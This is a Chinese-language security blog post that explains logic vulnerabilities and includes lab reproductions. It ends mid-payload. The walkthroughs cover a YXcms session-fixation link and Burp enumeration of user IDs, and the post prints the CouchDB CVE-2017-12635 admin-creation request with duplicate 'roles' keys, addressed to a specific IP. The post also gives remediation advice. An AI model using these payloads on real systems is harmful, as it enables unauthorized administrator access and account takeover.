@@ -1,0 +1,444 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1></h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-07-29T12:11:20.670Z" id="date"> 2023-07-29</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-07-29T12:39:03.537Z" id="updated"> 2023-07-29</time></div></span><br><span>Word Count: <div class="control">12.6k</div></span><br><span>Read Time: <div class="control">46 min</div></span></div></div><hr><div id="post-content"><h1>浅析逻辑漏洞</h1>
+<h2 id="1-漏洞介绍"><a href="#1-漏洞介绍" class="headerlink" title="1-漏洞介绍"></a>1. 漏洞介绍</h2>
+<h3 id="1-1-成因"><a href="#1-1-成因" class="headerlink" title="1-1-成因"></a>1.1 成因</h3>
+<p>设计阶段产生，老司机也会产生、相对难发现、难以防护，相对容易利用 第三方逻辑缺陷、没有在设计初期进行安全审计、安全水平及对安全认知程度不一致</p>
+<pre><code>	逻辑漏洞是指由于程序逻辑不严或逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误，一般出现任意密码修改（没有旧密码验证）、越权访问、密码找回、交易支付金额等。
+</code></pre>
+<p>​		逻辑漏洞是指攻击者利用业务/功能上的设计缺陷，获取敏感信息或破坏业务的完整性, 逻辑漏洞的破坏方式并非是向程序添加破坏内容，而是利用逻辑处理不严密或者代码问题或固有不足，操作上并不影响程序的允许，在逻辑上是顺利执行的。</p>
+<p>这种漏洞一般防护手段或设备无法阻止，因为走的是合法流量也没有防御标准。</p>
+<h3 id="1-2-分析"><a href="#1-2-分析" class="headerlink" title="1-2-分析"></a>1.2 分析</h3>
+<p>​		对常见的漏洞进行过统计，发现其中越权操作和逻辑漏洞占比最高，很多平台中基本都有发现，包括任意查询用户信息、任意删除等行为；最严重的漏洞出现在账号安全，包括重置任意用户密码、验证码暴力破解等。</p>
+<p><strong>逻辑漏洞的重要性</strong></p>
+<p>常见的OWASP漏洞，通过漏洞扫描工具，大多支持自动化或者半自动化扫描出来，并且传统的安全设备或者防护措施收效甚微</p>
+<p>​		但逻辑漏洞是和系统自身功能和逻辑有关系的漏洞，每一家的漏洞出现可能存在一定的独特性，很难复制或者通过规则脚本和漏扫工具扫描出来，因此逻辑漏洞大多需要配合代码审计和手段测试才可以发现相关漏洞，也是工具无法代替人工的漏洞。</p>
+<p class='item-img' data-src='image-20230706213619400.png'><img src="image-20230706213619400.png" alt="image-20230706213619400"></p>
+<h2 id="2-逻辑漏洞详解"><a href="#2-逻辑漏洞详解" class="headerlink" title="2-逻辑漏洞详解"></a>2. 逻辑漏洞详解</h2>
+<h3 id="2-1-常见的逻辑漏洞"><a href="#2-1-常见的逻辑漏洞" class="headerlink" title="2-1-常见的逻辑漏洞"></a>2.1 常见的逻辑漏洞</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">逻辑漏洞的分类<br><br>    越权漏洞<br><br>    密码需改<br><br>    密码找回<br><br>    验证码漏洞<br><br>    支付漏洞<br><br>    投票/积分/抽奖<br><br>    短信轰炸<br><br>即：交易支付、密码修改、密码找回、越权修改、越权查询、突破限制等各类逻辑漏洞。<br></code></pre></td></tr></table></figure>
+<h3 id="2-2-如何挖掘逻辑漏洞"><a href="#2-2-如何挖掘逻辑漏洞" class="headerlink" title="2-2-如何挖掘逻辑漏洞"></a>2.2 如何挖掘逻辑漏洞</h3>
+<pre><code>确定业务流程---&gt;寻找流程中可以被操控的环节---&gt;分析可被操控环节中可能产生的逻辑问题---&gt;尝试修改参数触发逻辑问题        
+</code></pre>
+<h3 id="2-3-身份验证漏洞"><a href="#2-3-身份验证漏洞" class="headerlink" title="2-3-身份验证漏洞"></a>2.3 身份验证漏洞</h3>
+<h4 id="1-暴力破解漏洞"><a href="#1-暴力破解漏洞" class="headerlink" title="1-暴力破解漏洞"></a>1. 暴力破解漏洞</h4>
+<p>漏洞介绍：攻击者可以通过该漏洞获取用户名和对应弱口令密码，并进行登录操作</p>
+<p>漏洞原理：由于没有设置登录失败次数限制，导致攻击者可以通过口令字典进行特定用户的密码爆破或通过用户名字典进行特定弱口令的用户枚举</p>
+<p>漏洞点：系统登录点</p>
+<p>漏洞修复： 对于固定用户名爆破密码</p>
+<blockquote>
+<p>可以针对用户名进行错误次数计算，高于一定阈值账号锁定一段时间，或者添加验证码</p>
+<p>但是不能永久锁定，可能被用来进行账户恶意锁定</p>
+</blockquote>
+<p>对于固定密码枚举用户名、 需要计算IP对URL的请求情况，某个IP短时间大量请求登录应该加入黑名单 进行传输数据加密有一定的防护效果</p>
+<h4 id="2-Session固定攻击"><a href="#2-Session固定攻击" class="headerlink" title="2-Session固定攻击"></a>2. Session固定攻击</h4>
+<p>漏洞介绍：会话固定攻击是利用服务器的session不变机制，借他人之手获得认证和授权，然后冒充他人</p>
+<p>漏洞原理：在请求登录过程时候，URL带有一个session，登录成功之后会将登录成功的信息绑定到这个session中，攻击者可以发送带有session的URL给相关工作人员诱导其登录，相当于获取了其身份信息</p>
+<p>攻击流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1、攻击者Attacker能正常访问该应用网站；<br><br>2、应用网站服务器返回一个会话ID给他；<br><br>3、攻击者Attacker用该会话ID构造一个该网站链接发给受害者Victim；<br><br>4-5、受害者Victim点击该链接，携带攻击者的会话ID和自己的用户名密码正常登录了该网站，会话成功建立；<br><br>6、攻击者Attacker用该会话ID成功冒充并劫持了受害者Victim的会话。<br><br>这里相当于受害者用该会话ID登录后，便将该会话ID提权为管理员了，而我们攻击者凭借该会话ID去登录该网站时，成功以管理员的身份进入，当然这里受害者是普通用户也是可以的<br></code></pre></td></tr></table></figure>
+<p>漏洞点：在GET方法请求登录时候带有session值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">访问网站（未登录）：获取cookie信息，获取sessionid<br>登录网站：查看cookie信息，获取sessionid<br>查看登录前，登录后sessionid是否相同，若相同，则存在该漏洞<br></code></pre></td></tr></table></figure>
+<p>修复思路：</p>
+<blockquote>
+<p>只要避免在URL中带入session信息即可比较有效的防御</p>
+<p>另外也要注意POST请求中带有sessionid进行session固定攻击，虽然可利用性比较低，但是建议修复</p>
+</blockquote>
+<h5 id="漏洞实战"><a href="#漏洞实战" class="headerlink" title="漏洞实战"></a>漏洞实战</h5>
+<p>这里用YXcms建站系统复现，由于源代码太难找了，这里就跟着走吧…</p>
+<h5 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h5>
+<p>yxcms允许我们自定义session，而且这个过程通过get方式来完成。我觉得这样的问题属于CSRF，不经意之间就能获取大效果。其问题代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>&lt;br&gt;<br><span class="hljs-comment">//公共类&lt;br&gt;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">commonController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">baseController</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)&lt;<span class="hljs-title">br</span>&gt;</span><br><span class="hljs-function"> </span>&#123;&lt;br&gt;<br> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">__construct</span>();&lt;br&gt;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpsessid&#x27;</span>])) <span class="hljs-title function_ invoke__">session_id</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpsessid&#x27;</span>]);<span class="hljs-comment">//通过GET方法传递sessionid,firefox&lt;br&gt;</span><br>        <span class="hljs-title function_ invoke__">session_starts</span>();&lt;br&gt;<br> ……<br></code></pre></td></tr></table></figure>
+<p>当$_GET[‘phpsessid’]非空时，就令session_id为我们传入的值。<br>
+于是我们构造一个链接让管理员点击，管理员点击后会重新设置他的session，而且这个session就是我们构造的。因为session重置了所以管理员也需要重新登录，而重新登录后其session_id就是我们构造的。我们只要利用这个session_id就能登录管理后台了。</p>
+<p>比如我构造一个链接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://192.168.36.140/yxcms/index.php?r=admin/index/index&amp;phpsessid=f4cking456<br></code></pre></td></tr></table></figure>
+<p>将这个链接发给受害者（火狐浏览器），诱使受害者管理员点击该链接，点击后后会跳转到登录页面，但此时他的phpsession已经是我们构造的f4cking456了</p>
+<p class='item-img' data-src='image-20230707192616715.png'><img src="image-20230707192616715.png" alt="image-20230707192616715"></p>
+<p>此时如果受害者登录这个网址，那么这个session就有后台权限了。<br>
+假如受害者登录该网址</p>
+<p class='item-img' data-src='image-20230707192633721.png'><img src="image-20230707192633721.png" alt="image-20230707192633721"></p>
+<p>那么我们利用这个链接</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.36.140/yxcms/index.php?r=admin/index/index&amp;phpsessid=f4cking456%EF%BC%8C%E5%B0%86%E8%87%AA%E5%B7%B1%E7%9A%84session%E8%AE%BE%E7%BD%AE%E6%88%90f4cking456%EF%BC%8C%E6%88%96%E8%80%85%E9%9A%8F%E6%84%8F%E6%80%8E%E4%B9%88%E4%BF%AE%E6%94%B9%EF%BC%8C%E5%8F%AA%E8%A6%81%E6%8A%8Aphpsessid%E4%BF%AE%E6%94%B9%E6%88%90f4cking123%E5%B0%B1%E8%83%BD%E6%8B%A5%E6%9C%89%E5%90%8E%E5%8F%B0%E6%9D%83%E9%99%90%E4%BA%86">http://192.168.36.140/yxcms/index.php?r=admin/index/index&amp;phpsessid=f4cking456，将自己的session设置成f4cking456，或者随意怎么修改，只要把phpsessid修改成f4cking123就能拥有后台权限了</a></p>
+<p>这时攻击者（谷歌浏览器）访问该链接，直接进入后台界面</p>
+<p class='item-img' data-src='image-20230707192717088.png'><img src="image-20230707192717088.png" alt="image-20230707192717088"></p>
+<p>有个前提就是，实战过程中你需要知道该网站后台地址是什么</p>
+<h4 id="3-Cookie欺骗漏洞"><a href="#3-Cookie欺骗漏洞" class="headerlink" title="3-Cookie欺骗漏洞"></a>3. Cookie欺骗漏洞</h4>
+<p>漏洞介绍：通过伪造cookie信息能够伪造其他用户进行登录。</p>
+<p>漏洞原理：开发者为了方便将身份信息/登录信息明文或者只是简单编码、哈希之后存放在cookie中，网站通过获取得到的cookie进行授权或者身份验证</p>
+<p>漏洞点：cookie中有明显或者只是简单编码、哈希的字段时候 修改lsLogin值为1可以判定为用户已经登录 修改cookie为asp163=UserName=admin</p>
+<p>漏洞修复： Cookie不应该存储可理解的身份信息和登录信息 按照规定，cookie对身份信息和登录信息的存储只能通过存储足够长度的随机字符串进行，避免篡改</p>
+<h5 id="漏洞实战-2"><a href="#漏洞实战-2" class="headerlink" title="漏洞实战-2"></a>漏洞实战</h5>
+<p>大体就是通过某种手段获取其他用户或者管理员的cookie，而由于该cookie存储的是可理解的身份信息和登录信息，则攻击者获取该cookie后，凭借该cookie登录网站便可以实现免密登录到其他用户或者管理员页面</p>
+<h3 id="2-4-权限类逻辑漏洞"><a href="#2-4-权限类逻辑漏洞" class="headerlink" title="2-4-权限类逻辑漏洞"></a>2.4 权限类逻辑漏洞</h3>
+<p>权限相关逻辑漏洞是逻辑漏洞中出现的最多的漏洞</p>
+<h4 id="1-平行权限跨越"><a href="#1-平行权限跨越" class="headerlink" title="1-平行权限跨越"></a>1. 平行权限跨越</h4>
+<p>漏洞介绍：即普通用户/管理员能访问其他普通用户/管理员才能够访问的系统信息或者系统功能</p>
+<p>形成原因：在进行方法调用时候未进行请求用户和目标信息拥有者是否匹配一致，直接用userid/email之类的容易遍历的参数进行数据库查询</p>
+<p>漏洞点：在普通用户/管理员登录后的能访问的链接或者功能中都可能存在</p>
+<p>漏洞修复：</p>
+<p>在权限管理中，平行越权的权限管理颗粒度最小</p>
+<p>需要在方法中进行相关的获取请求request，再利用getAttribute(“userid”)获取其userid，直接使用该userid作为参数进行数据增删查改，避免userid参数传输</p>
+<h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5>
+<p>登录，同时bp抓包：</p>
+<p class='item-img' data-src='image-20230707195809298.png'><img src="image-20230707195809298.png" alt="image-20230707195809298"></p>
+<p class='item-img' data-src='image-20230707195907016.png'><img src="image-20230707195907016.png" alt="image-20230707195907016"></p>
+<p>放包，可以看到当前的test用户（这里放包了很多次…）</p>
+<p class='item-img' data-src='image-20230707200042178.png'><img src="image-20230707200042178.png" alt="image-20230707200042178"></p>
+<p>在这里可以看到这个card_id对应的就是每个用户对应的id</p>
+<p>发送到爆破模块遍历一下，这里他是对后两位进行的遍历</p>
+<p class='item-img' data-src='image-20230707200214634.png'><img src="image-20230707200214634.png" alt="image-20230707200214634"></p>
+<p class='item-img' data-src='image-20230707200304348.png'><img src="image-20230707200304348.png" alt="image-20230707200304348"></p>
+<p>然后来到登录界面，右键查看马春生的图片，检查源代码属性：发现其id尾号以16结尾，我们开始爆破</p>
+<p class='item-img' data-src='image-20230707200358755.png'><img src="image-20230707200358755.png" alt="image-20230707200358755"></p>
+<p>这里就是马春生的个人信息</p>
+<p class='item-img' data-src='image-20230707200500204.png'><img src="image-20230707200500204.png" alt="image-20230707200500204"></p>
+<p>我们将密码拿去md5破解一下</p>
+<p class='item-img' data-src='image-20230707200644088.png'><img src="image-20230707200644088.png" alt="image-20230707200644088"></p>
+<p>随后凭借该用户名和密码登录即可，成功拿到key</p>
+<p class='item-img' data-src='image-20230707200729146.png'><img src="image-20230707200729146.png" alt="image-20230707200729146"></p>
+<h5 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h5>
+<p>先公布一下背景</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">钻石代理商马春生同学卷款逃跑，多位下级代理内心受到了难以磨灭的伤害，为了找到她我们将通过代理网站获取到她的手机号码等信息。<br></code></pre></td></tr></table></figure>
+<p>这里我也是跟着教程做的，因此几乎没有自己的思考，为了不摸鱼，还是浅浅总结一下</p>
+<p>题目告知我们重点是马春生，那我们便要实现水平越权以便以马春生的用户信息登录网站，那我们进入靶场（我尽可能的以实战的思路来吧），首先就是搜集信息，burp抓包，F12这些肯定是少不了的，这里也是学到了一点东西，搜集信息尤为重要</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">这里在实战中就是会费时间，这里我陈述的也就是凭借答案来陈述吧，所以会参考性低一些<br>我们burp抓包，然后观察抓到的东西，一次次放包查看什么时候会有重要信息，随后我们在放包的过程中，很幸运在url头发现了有关证明用户信息的id，并且联系我们之前对页面的那些图片的查看，发现图片的src处有一堆数字，这与我们发现的用户id及其相似，那我们有理由推断那就是马春生同学的用户id，但我们只能了解到这里，想要获取他的用户名密码便无从下手，于是我们通过burp的爆破模块，对用户id后两位进行遍历，成功在id=16处（也就是马春生同学的id）发现了马春生的详细个人信息，至此我们成功实现水平越权（服务端没有对用户id做出精确的维护）<br></code></pre></td></tr></table></figure>
+<h4 id="2-垂直权限跨越"><a href="#2-垂直权限跨越" class="headerlink" title="2-垂直权限跨越"></a>2. 垂直权限跨越</h4>
+<p>漏洞介绍：即普通用户能够访问管理员甚至超级管理员才能够访问的系统信息或者系统功能</p>
+<p>形成原因：程序在方法调用时候，缺少角色等级校验</p>
+<p>漏洞点：在任何用户登录后才能访问的链接或者功能中都可能存在</p>
+<p>对每一个传输的参数都要了解参数的目的，尝试将用户名改为admin尝试绕过</p>
+<p>漏洞修复：</p>
+<p>需要校验用户是否有权限访问这个方法</p>
+<p>获取请求request，再利用getAuttribute(“roleid”)获取其角色等级，检查角色等级是否合法，错误则直接返回错误跳转，返回页面必须仍然从Attribute中获取userid再进一步查询相关信息，值得注意的是切勿将错误跳转写到Javascript里面，还返回目标URL页面的相关信息。</p>
+<h5 id="Couchdb-垂直越权（CVE-2017-12635）"><a href="#Couchdb-垂直越权（CVE-2017-12635）" class="headerlink" title="Couchdb-垂直越权（CVE-2017-12635）"></a>Couchdb 垂直越权（CVE-2017-12635）</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Couchdb简介<br>	Apache CouchDB是一个开源数据库，专注于易用性和成为&quot;完全拥抱web的数据库&quot;。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。<br><br>​ 在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。<br><br>​ 影响版本：Apache CouchDB before 1.7.0 and 2.x before 2.1.1<br></code></pre></td></tr></table></figure>
+<p><strong>漏洞成因</strong></p>
+<p>问题在于 Javascript JSON 解析器（在验证脚本中使用）与 CouchDB 内部使用的名为<a target="_blank" rel="noopener" href="https://github.com/apache/couchdb-jiffy">jiffy</a>的解析器之间存在差异。查看每个对象如何处理对象上的重复键，例如：<code>&#123;&quot;foo&quot;:&quot;bar&quot;, &quot;foo&quot;:&quot;baz&quot;&#125;</code></p>
+<p>Erlang：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jiffy">&gt; jiffy:decode(&quot;&#123;\&quot;foo\&quot;:\&quot;bar\&quot;, \&quot;foo\&quot;:\&quot;baz\&quot;&#125;&quot;). <br>&#123;[&#123;&lt;&lt;&quot;foo&quot;&gt;&gt;,&lt;&lt;&quot;bar&quot;&gt;&gt;&#125;,&#123;&lt;&lt;&quot;foo&quot;&gt;&gt;,&lt;&lt;&quot;baz&quot;&gt;&gt;&#125;]&#125;<br></code></pre></td></tr></table></figure>
+<p>JavaScript：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json">&gt; JSON.parse(<span class="hljs-string">&quot;&#123;\&quot;foo\&quot;:\&quot;bar\&quot;, \&quot;foo\&quot;: \&quot;baz\&quot;&#125;&quot;</span>)<br><span class="hljs-punctuation">&#123;</span>foo<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;baz&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+<p>对于给定的键，Erlang 解析器将存储这两个值，但 Javascript 解析器将仅存储最后一个值。不幸的是，CouchDB 数据内部表示的 get_value 函数只会返回<em>第一个</em>值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">% Within couch_util:get_value <br>lists:keysearch(Key, 1, List).<br> <br> <br>% keysearch(Key, N, TupleList) -&gt; &#123;value, Tuple&#125; | false<br>% Searches the list of tuples TupleList for a tuple whose Nth element compares equal to Key. Returns &#123;value, Tuple&#125; if such a tuple is found, otherwise false.<br><br>//在元组TupleList列表中搜索其第n个元素比较等于Key的元组。如果找到这样的元组，则返回&#123;value, Tuple&#125;，否则返回false。<br></code></pre></td></tr></table></figure>
+<p>因此，我们可以绕过所有相关的输入验证并创建一个管理员用户：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http">curl -X PUT &#x27;http://your-ip:5984/_users/org.couchdb.user:oops&#x27;<br>--data-binary &#x27;&#123;<br>  &quot;type&quot;: &quot;user&quot;,<br>  &quot;name&quot;: &quot;oops&quot;,<br>  &quot;roles&quot;: [&quot;_admin&quot;],<br>  &quot;roles&quot;: [],<br>  &quot;password&quot;: &quot;password&quot;<br>&#125;&#x27;<br></code></pre></td></tr></table></figure>
+<p>js解析只存储第二个值，roles为空，权限放行；但Eralang解析器将解析并存储两个值，但是在CouchDB中get_value函数只返回了jiffy所解析到的第一个键的值，即admin，管理员权限。</p>
+<p>注：通过查看源码，权限判断中，只要roles长度大于0就返回forbidden，只有管理员才能进行修改。</p>
+<p>所以此POC成功绕过js的检查，并成功被erlang解析为管理员账户。</p>
+<p>进入实际环境中会发生如下身份验证过程：</p>
+<p>JavaScript在检测时，检测我们创建的用户“角色＝０”。无角色，也就不存在权限，所以没有危害，系统判定为安全，绕过了检测。接下来在CouchDB的Erlang部分实现身份验证和授权时，jiffy实现的时候，getter函数只返回第一个值也就是&quot;roles&quot;: [“_admin”],所以创建出了具有admin权限的账户。</p>
+<p><strong>开始复现</strong></p>
+<p>访问首页发现是json数据</p>
+<p class='item-img' data-src='image-20230708170804110.png'><img src="image-20230708170804110.png" alt="image-20230708170804110"></p>
+<p>接下来访问<a target="_blank" rel="noopener" href="http://127.0.0.1:5984/_utils/">http://127.0.0.1:5984/_utils/</a> 发现</p>
+<p class='item-img' data-src='image-20230708171343041.png'><img src="image-20230708171343041.png" alt="image-20230708171343041"></p>
+<p>点击验证数据库正确性，发现我们不是管理员无权操作，这样的话我们尝试直接创建一个管理员用户</p>
+<p class='item-img' data-src='image-20230708171638073.png'><img src="image-20230708171638073.png" alt="image-20230708171638073"></p>
+<p>接下来用的是网上的poc：用put发送一个请求创建管理员的数据包</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/_users/org.couchdb.user:hybcx</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>124.220.233.26:5984<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>108<br><br><span class="language-prolog">&#123;</span><br><span class="language-prolog"><span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>,</span><br><span class="language-prolog"><span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;hybcx&quot;</span>,</span><br><span class="language-prolog"><span class="hljs-string">&quot;roles&quot;</span>: [<span class="hljs-string">&quot;_admin&quot;</span>],</span><br><span class="language-prolog"><span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;hybcx&quot;</span></span><br><span class="language-prolog">&#125;</span><br></code></pre></td></tr></table></figure>
+<p>先用bp抓个包，其实抓不抓都无所谓，我们也可以在终端上通过curl发送put数据包</p>
+<p class='item-img' data-src='image-20230708172042668.png'><img src="image-20230708172042668.png" alt="image-20230708172042668"></p>
+<p>接下来在bp上，输入上述poc，如下图发现我们不是管理员，无权创建管理员账户</p>
+<p class='item-img' data-src='image-20230708172514410.png'><img src="image-20230708172514410.png" alt="image-20230708172514410"></p>
+<p>但发送包含两个roles的数据包，即可绕过限制，创建一个管理员账户，这里创建了一个账户密码皆为hybcx的管理员账户，发送如下poc</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/_users/org.couchdb.user:hybcx</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>124.220.233.26:5984<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>108<br><br><span class="language-prolog">&#123;</span><br><span class="language-prolog"><span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>,</span><br><span class="language-prolog"><span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;hybcx&quot;</span>,</span><br><span class="language-prolog"><span class="hljs-string">&quot;roles&quot;</span>: [<span class="hljs-string">&quot;_admin&quot;</span>],</span><br><span class="language-prolog"><span class="hljs-string">&quot;roles&quot;</span>: 